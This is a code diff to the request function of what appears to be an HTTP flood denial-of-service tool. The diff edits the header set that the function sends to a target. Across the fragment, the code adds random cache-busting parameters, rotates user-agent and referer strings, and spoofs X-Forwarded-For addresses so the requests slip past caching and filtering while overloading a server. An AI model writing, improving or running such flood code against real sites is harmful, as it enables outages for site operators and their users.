@@ -62,16 +62,16 @@ def httpcall(url):
     payload = buildblock(random.randint(0, 10)) + '=' + buildblock(random.randint(0,10))
     request_url = url + param_joiner + payload
     headers = {
-        'User-Agent': random.choice(uagent),
-        'Cache-Control': 'no-cache',
-        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Referer': random.choice(referer_list()) + buildblock(random.randint(0, 10)),
-        'Keep-Alive': str(random.randint(120, 130)),
-        'Connection': 'keep-alive',
-        'Host': host,
-        'X-Forwarded-For': random_ipFake()
-    }
+    'User-Agent': random.choice(uagent),
+    'Cache-Control': 'no-cache',
+    'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
+    'Accept-Charset': 'iso-8859-1,utf-8;q=0.7,*;q=0.7',
+    'Referer': random.choice(referer_list()),
+    'Keep-Alive': str(random.randint(120, 130)),
+    'Connection': 'keep-alive',
+    'Host': host,
+    'X-Forwarded-For': random_ipFake()
+}
 
     try:
         urllib.request.urlopen(urllib.request.Request(request_url, headers=headers))
